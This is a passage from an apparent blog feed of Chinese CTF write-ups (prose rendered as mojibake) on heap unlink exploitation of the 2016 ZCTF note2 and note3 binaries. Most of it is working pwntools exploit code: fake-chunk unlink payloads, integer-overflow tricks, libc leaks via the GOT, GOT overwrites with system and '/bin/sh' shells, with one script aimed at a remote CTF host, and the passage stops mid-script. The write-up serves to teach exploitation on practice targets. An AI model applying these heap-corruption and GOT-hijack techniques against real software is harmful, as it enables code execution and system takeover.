change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *0x004014B8&#x27;)#change 2</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401314&#x27;)#remove 3</span></span><br><span class="line">db(<span class="string">&#x27;b *0x401725&#x27;</span>)<span class="comment">#exit</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line">change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6030E8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0x30</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># first way++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># overflow_benderinuse(b&#x27;\x01&#x27;)</span></span><br><span class="line"><span class="comment"># payload = p64(0)*3+ p64(free_got)+p64(puts_got)+p64(atoi_got)</span></span><br><span class="line"><span class="comment"># change(6,payload)</span></span><br><span class="line"><span class="comment"># change(6,p64(puts_plt))</span></span><br><span class="line"><span class="comment"># remove(2)</span></span><br><span class="line"><span class="comment"># puts_ad=u64(r(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># p(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># libc=LibcSearcher(&#x27;puts&#x27;,puts_ad)</span></span><br><span class="line"><span class="comment"># base=puts_ad-libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># system=libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line"><span class="comment"># change(1,p64(system))</span></span><br><span class="line"><span class="comment"># sla(b&#x27;oice : &#x27;,b&#x27;sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># second way+++++++++++++++++++</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x6030e8</span>)</span><br><span class="line">change(<span class="number">6</span>,payload)</span><br><span class="line">write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">leaveret=<span class="number">0x40172a</span></span><br><span class="line">ret=<span class="number">0x40172b</span></span><br><span class="line">write(elf.got[<span class="string">&#x27;exit&#x27;</span>], leaveret)</span><br><span class="line">change(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">sla(<span class="string">b&#x27;choice : &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;great!! Thx &#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">write(elf.got[<span class="string">&#x27;free&#x27;</span>], system)</span><br><span class="line">change(<span class="number">1</span>,p64(<span class="built_in">bin</span>))</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
            <tag> Fastbin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink 2016-ZCTF-note2-and-note3</title>
      <link href="/2023/03/15/2016-ZCTF-note2-and-note3/"/>
      <url>/2023/03/15/2016-ZCTF-note2-and-note3/</url>
      
        <content type="html"><![CDATA[<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016-ZCTF-note2"></a>2016-ZCTF-note2</h2><p><a href="https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2">https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec note2</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æ²¡å¼€pieè€Œä¸”æœ‰æŒ‡é’ˆå…¨å±€æ•°ç»„å†bssæ®µï¼Œæœ€å¤šå››ä¸ªå †å—ï¼Œå¯é€šè¿‡æ•°ç»„é‡Œçš„æŒ‡é’ˆç¼–è¾‘ä¿®æ”¹æ•°æ®ï¼Œä¼˜å…ˆè€ƒè™‘unlink</p><p>æ‰¾æ‰¾å“ªé‡Œæœ‰å †æº¢å‡ºä¸</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ReadStr</span><span class="params">(<span class="type">char</span> *s, __int64 len, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰äº†ä¸€ä¸ªè¾“å…¥å‡½æ•°ï¼Œå¯æƒœå¿½ç•¥äº†signedæ•°å’Œunsignedæ•°æ¯”è¾ƒæ—¶signedä¼šè½¬å˜ä¸ºunsignedæ•°ï¼Œæˆ‘ä»¬malloc(0)æ—¶ï¼Œlen-1ä¸º-1,-1å’Œunsigned iæ¯”è¾ƒæ—¶ä¼šå˜ä¸º0xffffffffï¼Œå¯ä»¥å †æº¢å‡º</p><p>malloc(0)æ—¶ï¼Œglibc çš„è¦æ±‚ chunk å—è‡³å°‘å¯ä»¥å­˜å‚¨ 4 ä¸ªå¿…è¦çš„å­—æ®µ (prev_size,size,fd,bk)ï¼Œæ‰€ä»¥ä¼šåˆ†é… 0x20 çš„ç©ºé—´ã€‚</p><h2 id="ä¼ªé€ unlink-chunk"><a href="#ä¼ªé€ unlink-chunk" class="headerlink" title="ä¼ªé€ unlink chunk"></a>ä¼ªé€ unlink chunk</h2><p>content &#x3D; bâ€™aâ€™ * 8 + p64(0xa1) + p64(fakefd) + p64(fakebk) + bâ€™bâ€™ * 0x48<br>newnote(0x80, content)<br>newnote(0, â€˜aâ€™ * 8)<br>newnote(0x80, â€˜bâ€™ * 16)</p><p>åœ¨chunk0é‡Œä¼ªé€ chunkï¼Œä¸ºäº†ç»•è¿‡&#x3D;Pçš„æ£€æµ‹æˆ‘ä»¬</p><p>ptr &#x3D; 0x0000000000602120 è¿™é‡Œå­˜å‚¨çš„æ˜¯ä¼ªé€ chunkçš„å¼€å§‹åœ°å€<br>fakefd &#x3D; ptr - 0x18<br>fakebk &#x3D; ptr - 0x10</p><p>è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨chunk1ç”³è¯·æ—¶è¿›è¡Œæº¢å‡ºï¼Œå› ä¸ºé‚£æ—¶å€™æˆ‘ä»¬è¿˜æ²¡æœ‰ç”³è¯·åˆ°chunk2ï¼Œæº¢å‡ºä¼šåˆ°topchunkï¼Œ</p><p>æˆ‘ä»¬å…ˆåˆ é™¤åœ¨ç”³è¯·å°±å¯ä»¥ï¼Œå› ä¸ºå¤§å°æ˜¯fastbinï¼Œå†ç”³è¯·è¿˜æ˜¯é‚£ä¸ªå †</p><p>deletenote(1)<br>content &#x3D; bâ€™aâ€™ * 16 + p64(0xa0) + p64(0x90)<br>newnote(0,content)</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æº¢å‡ºchunk2</p><p>deletenote(2) unlink</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png" alt="image-20230315170826792"></p><p>å’Œæˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡ç« è®¨è®ºçš„ä¸€æ ·æŠŠptråœ°å€å†…å®¹æ”¹ä¸ºptr-0x18</p><h2 id="leak-æ‹¿shell"><a href="#leak-æ‹¿shell" class="headerlink" title="leak æ‹¿shell"></a>leak æ‹¿shell</h2><p>ä¿®æ”¹chunk0æŠŠptr[0]ä¿®æ”¹ä¸ºatoi_got,ç›´æ¥showå°±å¯ä»¥æ³„éœ²å‡ºæ¥atoiåœ°å€</p><p>atoi_got &#x3D; elf.got[â€˜atoiâ€™]<br>content &#x3D; bâ€™aâ€™ * 0x18 + p64(atoi_got)<br>editnote(0, 1, content)<br>shownote(0)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png" alt="image-20230315171243972"></p><p>å†åˆ©ç”¨editæ”¹å†™å…¶gotä¸ºsystemï¼Œè¾“å…¥binshæ‹¿shellå³å¯</p><p>content &#x3D; p64(system)<br>editnote(0, 1, content)<br>ru(bâ€™optionâ€”&gt;&gt;â€™)<br>sl(bâ€™&#x2F;bin&#x2F;sh\x00â€™)</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png" alt="image-20230315164908151"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    io.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400C65&#x27;)#new</span></span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400CE4&#x27;)#delete</span></span><br><span class="line">db(<span class="string">&#x27;b *0x400F74&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">base=atoi_ad-libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">content = p64(system)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">ru(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note3"><a href="#2016-ZCTF-note3" class="headerlink" title="2016-ZCTF-note3"></a>2016-ZCTF-note3</h2><p><a href="https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3">https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3</a></p><p>å’Œnote2ä¸€æ ·çš„ä¿æŠ¤</p><p>å’Œnote2ç›¸æ¯”ï¼Œè¿™æ¬¡å¯ä»¥ç”³è¯·æœ€å¤š7ä¸ªchunkï¼Œå…¨å±€æŒ‡é’ˆæ•°ç»„0x6020C0çš„0æ˜¯æœ€è¿‘ç”³è¯·æˆ–ä¿®æ”¹è¿‡çš„æŒ‡é’ˆï¼Œåé¢ä¾æ¬¡é¡ºåºæ˜¯mallocçš„chunk</p><p>è¿™æ¬¡æ²¡æœ‰äº†showå‡½æ•°å¸®æˆ‘æ–¹ä¾¿çš„leakåœ°å€</p><p>è€çš„å †æº¢å‡ºçš„æ¼æ´ä¾æ—§å­˜åœ¨</p><p>è¿˜æœ‰äº†æ–°çš„å †æº¢å‡ºæ–¹å¼</p><h3 id="ç¬¬ä¸€ç§æº¢å‡ºæ–¹å¼"><a href="#ç¬¬ä¸€ç§æº¢å‡ºæ–¹å¼" class="headerlink" title="ç¬¬ä¸€ç§æº¢å‡ºæ–¹å¼"></a>ç¬¬ä¸€ç§æº¢å‡ºæ–¹å¼</h3><p>å’Œä¹‹å‰ä¸€ä¸‹è‡ªå®šä¹‰readæ—¶-1è½¬æ¢ä¸ºæ— ç¬¦å·è¯»å–å³å¯</p><h3 id="ç¬¬äºŒç§æº¢å‡ºæ–¹å¼"><a href="#ç¬¬äºŒç§æº¢å‡ºæ–¹å¼" class="headerlink" title="ç¬¬äºŒç§æº¢å‡ºæ–¹å¼"></a>ç¬¬äºŒç§æº¢å‡ºæ–¹å¼</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  v0 = getsize();</span><br><span class="line">  v3 = v0 % <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 % <span class="number">7</span> &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (__int64)*(&amp;ptr + v3);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">      myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + v3);</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Edit success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;please input correct id.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">getsize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myread((__int64)nptr, <span class="number">32LL</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> -v1;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>NEGæŒ‡ä»¤ -x&#x3D;~x+1</strong></p><p>å½“xä¸ºè¯¥ä½æ•°å¯ä»¥è¡¨ç¤ºçš„æœ€å¤§è´Ÿæ•°æ—¶ï¼Œæ¯”å¦‚int æœ€å¤§è´Ÿæ•°0x80000000 </p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png" alt="image-20230315233602653" style="zoom:67%;"><p>å–å+1è¿˜æ˜¯0x80000000 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">-2147483648</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2==-v2) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ohhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png" alt="image-20230315233803481"></p></blockquote><p>è¿™é‡Œæˆ‘ä»¬è¾“å…¥æœ€å¤§è´Ÿæ•´æ•°-9223372036854775808ï¼Œgetsizeè¿”å›-v1è¿˜æ˜¯è¿™ä¸ªå€¼ç»™åˆ°edité‡Œçš„v0ï¼Œv3&#x3D;-1ï¼ŒåŒæ—¶æ»¡è¶³ v0 % 7 &gt;&#x3D; v0</p><p><code>myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + 8], 10);</code></p><p>è¿™æ ·æˆ‘ä»¬ä¿®æ”¹ptr[-1]ä¹Ÿå°±æ˜¯æœ€è¿‘ä½¿ç”¨çš„å †ï¼Œå¤§å°ä¸ºptr_st[-1 + 8]ï¼Œç¬¬6ä¸ªchunkçš„å¤§å°ï¼Œæˆ‘ä»¬æŠŠç¬¬6ä¸ªchunkåœ°å€ç”³è¯·çš„æ¯”æœ€è¿‘ä½¿ç”¨çš„é‚£ä¸ªå¤§å°±å¯ä»¥å®ç°å †æº¢å‡º</p><h3 id="ç¬¬ä¸‰ç§"><a href="#ç¬¬ä¸‰ç§" class="headerlink" title="ç¬¬ä¸‰ç§"></a>ç¬¬ä¸‰ç§</h3><p>newæ—¶æ£€æµ‹äº†chunkä¸ªæ•°æ˜¯ä¸æ˜¯å¤§äº7ï¼Œä½†æ˜¯åªæ˜¯putsï¼Œå¹¶æ²¡æœ‰å®è´¨æ€§çš„é˜»å€¼ç”³è¯·ï¼Œç”³è¯·åä¼šæŠŠchunk8çš„ptræ”¾åˆ°ptræ•°ç»„å¼€å¤´çš„åŒæ—¶ä¼šæŠŠptræ”¾åˆ°ï¼Œchunk1çš„sizeæŒ‡é’ˆåœ°å€é‡Œï¼Œæ”¹å˜äº†chunk1çš„sizeï¼Œå¯ä»¥å®ç°æº¢å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note is full, add fail&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 1024)&quot;</span>)</span><br><span class="line">      </span><br><span class="line">  *(&amp;ptr + i) = v3;</span><br><span class="line">  ptr_st[i + <span class="number">8</span>] = size;</span><br><span class="line">  ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + i);</span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–å¥½è¯´"><a href="#å…¶ä»–å¥½è¯´" class="headerlink" title="å…¶ä»–å¥½è¯´"></a>å…¶ä»–å¥½è¯´</h3><p>å¸¸è§„æ„é€ unlinkåï¼Œæ²¡æœ‰showæ–¹ä¾¿æ³„éœ²åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ©ç”¨putsè‡ªå·±æ³„éœ²</p><p>æ”¹å†™freegotå†…å®¹ä¸ºputsï¼Œ<strong>è¿™é‡Œæ”¹å†™æ—¶è¦æ³¨æ„å‘é€7ä¸ªå­—èŠ‚å³å¯p64(puts_plt)[:-1]ï¼Œå¦‚æœ8ä¸ªå­—èŠ‚+ä¸€ä¸ª&#x2F;n,&#x2F;næœ€ååˆè¢«ç½®é›¶ï¼Œæ‰€ä»¥è¦†ç›–freegotæ—¶ï¼Œä¼šè¯¯è¦†ç›–freegotçš„ä¸‹ä¸€ä¸ªputsgotæœ€ä½ä¸€ä¸ªå­—èŠ‚ä¸º\x00é€ æˆç¨‹åºå´©æºƒ</strong></p><p>æ”¹å†™å¦ä¸€ä¸ªchunkæŒ‡é’ˆä¸ºputs_pltï¼Œfreeè¿™ä¸ªchunkå¯ä»¥æ³„éœ²åœ°å€ï¼Œ</p><p>å†æ”¹å†™atoi-gotä¸ºsystemå³å¯</p><p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png" alt="image-20230316002002255"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25662&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: 